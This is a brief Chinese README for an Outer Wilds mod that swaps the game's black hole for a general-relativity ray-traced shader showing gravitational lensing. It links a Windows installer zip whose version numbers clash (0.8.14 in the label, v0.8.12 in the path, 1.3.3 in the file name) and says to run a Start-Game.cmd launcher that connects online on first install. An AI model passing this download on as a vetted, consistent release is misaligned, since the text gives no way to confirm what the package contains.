# 《星际拓荒》太阳黑洞模组

这是《星际拓荒》（Outer Wilds）的太阳黑洞模组。

用基于广义相对论的光追着色器替换原版黑洞着色器。沿弯曲光路追踪行星成像，呈现引力透镜产生的弧与环。

**显卡参考**　RTX 4070 Laptop（8 GB）已通过实测。

[下载 Windows 安装包（0.8.14）](https://github.com/yang9-btw/OuterWilds-SolarBlackHole-Releases/releases/download/v0.8.12/OuterWilds-SolarBlackHole-1.3.3-Lens-0.8.14-Windows-Setup.zip)

适用于 Windows Steam 版，使用 Direct3D 11。解压后运行 `Start-Game.cmd`，首次安装需要联网。
